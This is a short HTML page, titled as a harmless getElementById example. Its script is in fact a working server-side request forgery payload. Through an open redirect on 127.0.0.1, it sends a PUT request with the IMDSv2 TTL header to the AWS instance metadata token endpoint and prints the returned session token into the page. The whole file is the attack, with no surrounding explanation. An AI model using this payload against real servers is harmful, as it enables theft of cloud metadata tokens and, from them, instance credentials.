<html>
<head>
  <title>getElementById example</title>
</head>
<body>
  <p id="output"></p>
  <p id="status"></p>
</body>
<script>
var url = "http://127.0.0.1/redir.php?url=http://127.0.0.1/latest/api/token";
var xhr = new XMLHttpRequest();
xhr.open("PUT", url, true);
xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds','21600');
xhr.onload = function () {
    if (xhr.readyState == 4 && xhr.status == "200") {
        document.getElementById('output').innerHTML = xhr.responseText;
    }
        document.getElementById("status").innerHTML = xhr.status;
        
}
xhr.send();
document.getElementById("status").innerHTML = "foobar <3";
</script>
</html>
